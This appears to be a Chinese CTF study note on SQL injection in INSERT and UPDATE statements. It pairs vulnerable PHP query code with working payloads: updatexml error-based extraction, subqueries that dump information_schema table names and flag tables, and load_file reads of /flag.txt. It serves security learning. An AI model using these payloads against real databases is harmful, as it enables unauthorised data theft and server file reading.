这里代表一定的非select注入。
<https://www.cnblogs.com/babers/articles/7252401.html>
## **报错回显注入**
如果存在报错回显，使用报错。
如：
```
$sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
	$result=$mysqli->query($sql);
	echo $sql;
	if($result===true){
		$mysqli->close();
		header("location:dpt.php");
	}else{
		die(mysqli_error($mysqli));//报错回显
	}
```
```
dpt_name=aa&dpt_address=aa&dpt_build_year=2021-04-02&dpt_has_cert=on&dpt_cert_number=a&dpt_telephone_number=xxx' or updatexml(1,concat(0x7e,substr((select group_concat(flag) from  sds_fl9g),20,30),0x7e),1)#
```

^
## **插入记录回显注入**
插入记录后，或修改记录后，有回显，如列表。
使用select语句或union联合注入。
```
$dpt_name="(select database())";
$sql="insert into user set name='".$dpt_name."';";

dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
dpt_name=1',sds_address=(select flag from sds_fl9g)#
```

^
## **update的注入**
```
$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];

如果在代码中可知
update语句中，在update后面有注入，
即old_address=$row['address']
```
1、修改前面字段值
```
可以通过注入修改此时的前面字段的值，如address字段
',`address`=database()#

',`address`=(select(load_file("/flag.txt")))#
```
2、where报错注入
```
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
```